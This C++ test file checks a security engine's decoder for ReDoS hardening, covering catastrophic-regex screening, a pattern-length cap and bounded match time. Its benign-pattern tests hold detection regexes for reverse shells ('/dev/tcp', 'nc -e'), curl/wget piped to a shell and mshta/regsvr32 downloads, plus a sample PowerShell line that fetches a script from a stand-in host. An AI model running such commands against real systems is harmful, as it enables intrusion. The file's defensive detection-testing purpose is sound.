// Regression tests for Decoder.cpp hardening added in this review:
//  - load-time pattern-length cap on decoder prematch/extract regexes
//  - load-time catastrophic-backtracking ("ReDoS") heuristic screen
//  - execution-time bound (regex_search_bounded) for patterns the load-time
//    heuristic does NOT catch (ambiguous alternation under a quantifier --
//    see JsonSafety.h and re-vega.md's writeup of Sage's finding 2)
// The first two skip just the offending decoder at LOAD time (never crash,
// never block the rest of the load) -- see Decoder::load_decoder_rules's
// doc comment. The third bounds a single regex_search call's wall-clock
// cost at MATCH time, for a pattern that compiled and loaded successfully
// but is pathological against certain inputs.
#include "catch2/catch.hpp"

#include <chrono>

#include "vajra_engine/Decoder.h"
#include "vajra_engine/Envelope.h"
#include "vajra_engine/JsonSafety.h"

using namespace vajra_engine;

namespace {
Envelope envelope_from(const std::string& json_text) { return Envelope::from_json_text(json_text); }
}  // namespace

TEST_CASE("looks_like_catastrophic_regex flags classic nested-quantifier ReDoS shapes",
          "[engine][decoder][redos]") {
    CHECK(looks_like_catastrophic_regex("(a+)+"));
    CHECK(looks_like_catastrophic_regex("(a*)+"));
    CHECK(looks_like_catastrophic_regex("(a+)*"));
    CHECK(looks_like_catastrophic_regex("(.*)+"));
    CHECK(looks_like_catastrophic_regex("([a-z]+)+"));
    CHECK(looks_like_catastrophic_regex("((a+)b)+"));  // nested quantifier propagates outward
    CHECK(looks_like_catastrophic_regex("(a+){2,}"));
}

TEST_CASE("looks_like_catastrophic_regex does not flag ordinary/benign patterns",
          "[engine][decoder][redos]") {
    // The actual patterns shipped in BuiltinRules.cpp / RulesetLoader.h's
    // decoder example -- a hardening pass that rejects real, useful,
    // non-pathological patterns is itself a regression.
    CHECK_FALSE(looks_like_catastrophic_regex(R"((curl|wget)\s[^|]*\|\s*(sh|bash))"));
    CHECK_FALSE(looks_like_catastrophic_regex(
        R"((bash\s+-i\s+>&\s*/dev/tcp/|nc\s+-e\s+/bin/(ba)?sh|/bin/(ba)?sh\s+-i\s))"));
    CHECK_FALSE(looks_like_catastrophic_regex(R"(-enc(odedcommand)?\s)"));
    CHECK_FALSE(looks_like_catastrophic_regex(R"((mshta|regsvr32)(\.exe)?\s[^\s]*https?://)"));
    CHECK_FALSE(looks_like_catastrophic_regex(R"((https?://[^\s]+))"));
    CHECK_FALSE(looks_like_catastrophic_regex("simple literal text"));
    CHECK_FALSE(looks_like_catastrophic_regex("a{2,5}"));      // bounded, not nested
    CHECK_FALSE(looks_like_catastrophic_regex(R"(\(a\+\)\+)"));  // escaped -- all literal
}

TEST_CASE("Decoder::load_decoder_rules skips a decoder whose extract pattern is catastrophic",
          "[engine][decoder][redos]") {
    Decoder decoder;
    std::vector<DecoderRuleConfig> configs;
    configs.push_back(DecoderRuleConfig{
        .name = "evil",
        .event_type = "",
        .source_field = "process.command_line",
        .prematch = "",
        .extract = "(a+)+$",
        .captures = {"decoded.x"},
    });
    decoder.load_decoder_rules(configs);
    CHECK(decoder.decoder_rule_count() == 0);
}

TEST_CASE("Decoder::load_decoder_rules skips a decoder whose prematch pattern is catastrophic",
          "[engine][decoder][redos]") {
    Decoder decoder;
    std::vector<DecoderRuleConfig> configs;
    configs.push_back(DecoderRuleConfig{
        .name = "evil-prematch",
        .event_type = "",
        .source_field = "process.command_line",
        .prematch = "(a*)*",
        .extract = "(x)",
        .captures = {"decoded.x"},
    });
    decoder.load_decoder_rules(configs);
    CHECK(decoder.decoder_rule_count() == 0);
}

TEST_CASE("Decoder::load_decoder_rules skips a decoder whose pattern exceeds the length cap",
          "[engine][decoder][redos]") {
    Decoder decoder;
    std::vector<DecoderRuleConfig> configs;
    configs.push_back(DecoderRuleConfig{
        .name = "too-long",
        .event_type = "",
        .source_field = "process.command_line",
        .prematch = "",
        .extract = "(" + std::string(kMaxRegexPatternLength + 1, 'a') + ")",
        .captures = {"decoded.x"},
    });
    decoder.load_decoder_rules(configs);
    CHECK(decoder.decoder_rule_count() == 0);
}

TEST_CASE("Decoder::load_decoder_rules still loads and fires a benign decoder (non-regression)",
          "[engine][decoder][redos]") {
    Decoder decoder;
    std::vector<DecoderRuleConfig> configs;
    configs.push_back(DecoderRuleConfig{
        .name = "extract-url",
        .event_type = "win_process",
        .source_field = "process.command_line",
        .prematch = "https?://",
        .extract = "(https?://[^\\s]+)",
        .captures = {"decoded.url"},
    });
    decoder.load_decoder_rules(configs);
    REQUIRE(decoder.decoder_rule_count() == 1);

    auto env = envelope_from(
        R"({"event_type":"win_process","cmdline":"powershell -c iwr http://evil.example/a.ps1"})");
    auto ev = decoder.decode(env);
    CHECK(ev.get("decoded.url") == "http://evil.example/a.ps1");
}

TEST_CASE("A regex the load-time heuristic does NOT catch (ambiguous alternation under a "
          "quantifier) is bounded at MATCH time instead of stalling the pipeline",
          "[engine][decoder][redos][regression]") {
    // Sage's finding 2 (re-sage.md) / redos_poc.cpp: "(a|aa)+$" is NOT a
    // nested-quantifier shape, so looks_like_catastrophic_regex() passes
    // it -- confirmed here too, as a standing assumption of this test.
    const std::string pattern = "(a|aa)+$";
    REQUIRE_FALSE(looks_like_catastrophic_regex(pattern));

    Decoder decoder;
    std::vector<DecoderRuleConfig> configs;
    configs.push_back(DecoderRuleConfig{
        .name = "sage-finding2-pattern",
        .event_type = "",
        .source_field = "process.command_line",
        .prematch = "",
        .extract = pattern,
        .captures = {},
    });
    decoder.load_decoder_rules(configs);
    REQUIRE(decoder.decoder_rule_count() == 1);  // loads fine -- this is an execution-time issue only

    const std::uint64_t timeouts_before = regex_search_timeout_count();

    // 35 bytes of 'a' + a non-matching terminator: unguarded, this exact
    // input measured ~1.8 SECONDS against a bare std::regex_search (see
    // redos_poc.cpp / re-vega.md). Bounded via decode()'s internal
    // regex_search_bounded call, it must return promptly instead.
    std::string cmdline(35, 'a');
    cmdline += '!';
    auto env = envelope_from(R"({"event_type":"bpf_process","cmdline":")" + cmdline + R"("})");

    const auto start = std::chrono::steady_clock::now();
    auto ev = decoder.decode(env);
    const auto elapsed = std::chrono::steady_clock::now() - start;
    const auto elapsed_ms = std::chrono::duration_cast<std::chrono::milliseconds>(elapsed).count();

    INFO("decode() took " << elapsed_ms << "ms (must be well under the ~1.8s an unbounded "
                           << "regex_search would take, and not too far past the ~75ms timeout)");
    // Generous upper bound (500ms, vs. kRegexSearchTimeout's 75ms) to
    // absorb scheduling jitter on a loaded CI box without flaking, while
    // still being two orders of magnitude below the ~1.8s unguarded cost
    // this regresses against.
    CHECK(elapsed_ms < 500);
    CHECK(regex_search_timeout_count() > timeouts_before);  // confirms it timed out, not "got lucky and matched fast"

    // The decoder rule that owns the pathological pattern must not have
    // extracted anything (timeout is treated as no-match, fails closed for
    // just this one decoder) -- and, critically, the event is still usable:
    // decode() returned normally rather than hanging the caller.
    CHECK_FALSE(ev.has("decoded.x"));
}
